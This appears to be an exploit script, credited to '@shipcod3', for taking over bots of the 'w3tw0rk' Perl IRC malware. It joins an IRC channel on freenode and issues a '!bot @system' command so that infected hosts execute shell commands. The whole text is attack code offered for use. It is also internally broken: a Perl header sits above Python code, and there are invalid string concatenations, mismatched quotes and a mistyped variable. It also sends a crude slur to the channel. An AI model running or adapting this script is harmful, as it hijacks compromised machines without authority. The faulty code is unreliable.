#!/usr/bin/perl
# w3tw0rk Perl IRC Bot Remote Code Execution
# author: @shipcod3
# for taking over a w3tw0rk Perl IRC Bot

import socket
import os
import sys
 
network = 'chat.freenode.net'
port = 6667
channel = "#batibot"
botOwner = "w3tw0rkhunter" 
irc = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
irc.connect ( ( network, port ) )
print irc.recv ( 4096 )
irc.send ( 'NICK' bot0wner '\r\n' )
irc.send ( 'USER jjt jjt jjt :just a fskin decoy\r\n' )
irc.send ( 'JOIN #batibot\r\n' )
irc.send ( 'PRIVMSG #batibot :!bot @system 'uname -a'r\n' )
while True:
   data = irc.recv ( 4096 )
   if data.find ( 'PING' ) != -1:
      irc.send ( 'PONG ' + data.split() [ 1 ] + '\r\n' )
   if data.find ( 'Linux' ) != -1:
      irc.send ( 'PRIVMSG #batibot :Gay\r\n' )
   if data.find ( '!quit' ) != -1:
      irc.send ( 'PRIVMSG #batibot :Fine, if you do not want me\r\n' )
      irc.send ( 'QUIT\r\n' )
   print data
